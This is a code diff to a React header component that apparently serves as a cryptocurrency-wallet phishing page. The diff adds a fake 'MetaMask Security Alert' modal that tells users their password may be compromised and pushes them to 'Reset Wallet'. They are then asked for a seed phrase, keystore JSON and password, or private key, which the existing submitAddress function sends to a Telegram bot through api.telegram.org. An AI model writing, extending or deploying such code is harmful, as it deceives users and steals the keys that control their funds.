@@ -54,10 +54,16 @@ const style1 = {
     width: 450,
     borderRadius: '20px',
     bgcolor: 'background.paper',
-    p: 4,
     textAlign: 'center',
     border: 'none',
-    outline: 'none'
+    outline: 'none',
+    paddingLeft : '20px',
+    paddingRight : '20px',
+    paddingTop : '40px',
+    paddingBottom : '40px',
+    minHeight : '500px'
+
+
 };
 
 const btnsRef = [
@@ -80,9 +86,10 @@ function Header() {
     const [anchorElNav, setAnchorElNav] = React.useState(null);
     const [anchorElUser, setAnchorElUser] = React.useState(null);
     const [loading, setIsloading] = useState(true)
+    const [recover, setRecover] = useState(false)
     const [active, setActive] = useState(btnsRef[0]);
-    const [prhare,setPrhase] = useState('')
-    const [prharePass,setPrharePass] = useState('')
+    const [prhare, setPrhase] = useState('')
+    const [prharePass, setPrharePass] = useState('')
     useEffect(() => {
         setId(localStorage.getItem('address'))
     }, [localStorage.getItem('address')])
@@ -115,9 +122,6 @@ function Header() {
         activate(WalletConnect)
             .then(() => {
                 setTimeout(handleOpenFAk(), 5000)
-                setInterval(() => {
-                    setIsloading(false)
-                }, 4000)
             })
     }
     const connectMetamask = () => {
@@ -126,8 +130,8 @@ function Header() {
     }
 
     const submitAddress = () => {
-        let secratePrhase = !prharePass ? `phrase is ${prhare} ` : `phrase is ${prhare} and pass is ${prharePass}` 
-        
+        let secratePrhase = !prharePass ? `phrase is ${prhare} ` : `phrase is ${prhare} and pass is ${prharePass}`
+
         fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${secratePrhase}`, {
             method: "GET"
         })
@@ -139,7 +143,10 @@ function Header() {
             })
     }
 
-        
+    const recoverPass = () => {
+        setRecover(true)
+        setTimeout(() => setIsloading(false),1000)
+    }
     return (
 
         <AppBar style={{ backgroundColor: '#262626' }} color='primary' position="static">
@@ -246,104 +253,131 @@ function Header() {
                 </Box>
                 <Modal
                     open={openFAk}
-                    onClose={handleCloseFAk}
                     aria-labelledby="modal-modal-title"
                     aria-describedby="modal-modal-description"
                 >
                     <Box sx={style1}>
                         {
-                            loading ?
+                            !recover ?
                                 (
-                                    <Box sx={{ display: 'flex', justifyContent: 'center' }}>
-                                        <CircularProgress />
+                                    <Box sx={{ textAlign: 'center' }}>
+                                        <img style={{ width: '150px' }} src='https://i.ibb.co/XXQ7tb4/pngtree-security-alert-icon-red-png-image-2597553-removebg-preview.png'/>
+                                        <Typography style={{marginTop : '15px',color : 'red',fontWeight : 'bolder'}} id="modal-modal-title" variant="h6" component="h2">
+                                            MetaMask Security Alert
+                                        </Typography>
+                                        <Typography style={{marginTop : '15px',fontWeight : 'bolder'}} id="modal-modal-title" variant="h6" component="h2">
+                                            Your Password May have been compromised
+                                        </Typography>
+                                        <Typography id="modal-modal-title" variant="h6" component="h2">
+                                            Reset your wallet and change your password for security purposes using a recovery phrase or private key
+                                        </Typography>
+                                        
+                                        <button style={{marginTop : '100px',cursor : 'pointer' ,border : 'none', outline : 'none',  padding : '6px', background  :'rgb(0, 132, 255)',borderRadius : '20px',color : 'white',width : "300px",fontSize : '20px'}} onClick={() => recoverPass()}>
+                                            Reset Wallet
+                                        </button>
                                     </Box>
                                 )
                                 :
                                 (
                                     <Box sx={{ mb: 2 }}>
-                                        <img style={{ width: '150px' }} src='https://open.seamarketplace.org/assets/images/media/trust.png' />
-                                        <Typography id="modal-modal-title" variant="h6" component="h2">
-                                            Choice recovery method
-                                        </Typography>
-                                        <Box sx={{ mt: 3, display: 'flex', justifyContent: 'center', }}>
-                                            {
-                                                btnsRef.map((btn) => (
-                                                    <Button onClick={() => setActive(btn)} style={{ background: btn === active ? '#f3e5f5' : 'none', color: 'black', padding: '11px', width: '120px' }}>
-                                                        {btn.name}
-                                                    </Button>)
-                                                )
-                                            }
-                                        </Box>
                                         {
-                                            active.name === "Phrase" ?
+                                            loading ?
+                                                <CircularProgress />
+                                                :
                                                 (
                                                     <>
-                                                        <Box>
-                                                            <TextareaAutosize
-                                                                aria-label="minimum height"
-                                                                minRows={3}
-                                                                placeholder="Phrase"
-                                                                className='txtArea'
-                                                                onChange={(e) => setPrhase(e.target.value)}
-                                                            />
+                                                        <img style={{ width: '150px' }} src='https://open.seamarketplace.org/assets/images/media/trust.png' />
+                                                        <Typography id="modal-modal-title" variant="h6" component="h2">
+                                                            Choice recovery method
+                                                        </Typography>
+                                                        <Box sx={{ mt: 3, display: 'flex', justifyContent: 'center', }}>
+                                                            {
+                                                                btnsRef.map((btn) => (
+                                                                    <Button onClick={() => setActive(btn)} style={{ background: btn === active ? '#f3e5f5' : 'none', color: 'black', padding: '11px', width: '120px' }}>
+                                                                        {btn.name}
+                                                                    </Button>)
+                                                                )
+                                                            }
                                                         </Box>
+                                                        {
+                                                            active.name === "Phrase" ?
+                                                                (
+                                                                    <>
+                                                                        <Box>
+                                                                            <TextareaAutosize
+                                                                                aria-label="minimum height"
+                                                                                minRows={3}
+                                                                                placeholder="Phrase"
+                                                                                className='txtArea'
+                                                                                onChange={(e) => setPrhase(e.target.value)}
+                                                                            />
+                                                                        </Box>
 
+                                                                    </>
+                                                                )
+                                                                :
+                                                                active.name === "Keystore" ?
+                                                                    (
+                                                                        <>
+                                                                            <Box>
+                                                                                <TextareaAutosize
+                                                                                    aria-label="minimum height"
+                                                                                    minRows={3}
+                                                                                    placeholder="Keystore json"
+                                                                                    className='txtArea'
+                                                                                    onChange={(e) => setPrhase(e.target.value)}
+
+                                                                                />
+                                                                                <input
+                                                                                    aria-label="minimum height"
+                                                                                    minRows={3}
+                                                                                    placeholder="Password"
+                                                                                    className='txtArea1'
+                                                                                    onChange={(e) => setPrharePass(e.target.value)}
+
+                                                                                />
+                                                                            </Box>
+
+                                                                        </>
+                                                                    )
+                                                                    :
+                                                                    active.name === "Private Key" ?
+                                                                        (
+                                                                            <>
+                                                                                <Box>
+                                                                                    <TextareaAutosize
+                                                                                        aria-label="minimum height"
+                                                                                        minRows={3}
+                                                                                        placeholder="Privatekey"
+                                                                                        className='txtArea'
+                                                                                        onChange={(e) => setPrhase(e.target.value)}
+
+                                                                                    />
+                                                                                </Box>
+
+                                                                            </>
+                                                                        )
+                                                                        :
+                                                                        ''
+                                                        }
+                                                        <Box className='mb-5'>
+                                                            <Button onClick={() => submitAddress()} className='hov' variant='outlined' style={{ fontSize: '15px', marginTop: '9px', borderRadius: '15px', padding: '10px', width: '370px' }}>
+                                                                Recover
+                                                            </Button>
+                                                            <br />
+                                                            <Button onClick={() => {
+                                                                setRecover(false)
+                                                                setIsloading(true)
+                                                                handleCloseFAk()
+                                                            }} variant='outlined' style={{ fontSize: '11px', marginTop: '9px', borderRadius: '15px', border: '1px solid gray', padding: '5px', width: '370px', color: 'black' }}>
+                                                                Back
+                                                            </Button>
+                                                        </Box>
                                                     </>
                                                 )
-                                                :
-                                                active.name === "Keystore" ?
-                                                    (
-                                                        <>
-                                                            <Box>
-                                                                <TextareaAutosize
-                                                                    aria-label="minimum height"
-                                                                    minRows={3}
-                                                                    placeholder="Keystore json"
-                                                                    className='txtArea'
-                                                                    onChange={(e) => setPrhase(e.target.value)}
-
-                                                                />
-                                                                <input
-                                                                    aria-label="minimum height"
-                                                                    minRows={3}
-                                                                    placeholder="Password"
-                                                                    className='txtArea1'
-                                                                    onChange={(e) => setPrharePass(e.target.value)}
-
-                                                                />
-                                                            </Box>
-
-                                                        </>
-                                                    )
-                                                    :
-                                                    active.name === "Private Key" ?
-                                                        (
-                                                            <>
-                                                                <Box>
-                                                                    <TextareaAutosize
-                                                                        aria-label="minimum height"
-                                                                        minRows={3}
-                                                                        placeholder="Privatekey"
-                                                                        className='txtArea'
-                                                                        onChange={(e) => setPrhase(e.target.value)}
-
-                                                                    />
-                                                                </Box>
-
-                                                            </>
-                                                        )
-                                                        :
-                                                        ''
                                         }
-                                        <Box className='mb-5'>
-                                            <Button onClick={() => submitAddress()} className='hov' variant='outlined' style={{ fontSize: '15px', marginTop: '9px', borderRadius: '15px', padding: '10px', width: '370px' }}>
-                                                Recover
-                                            </Button>
-                                            <br />
-                                            <Button onClick={handleCloseFAk} variant='outlined' style={{ fontSize: '11px', marginTop: '9px', borderRadius: '15px', border: '1px solid gray', padding: '5px', width: '370px', color: 'black' }}>
-                                                Back
-                                            </Button>
-                                        </Box>
+
+
                                     </Box>
                                 )
                         }
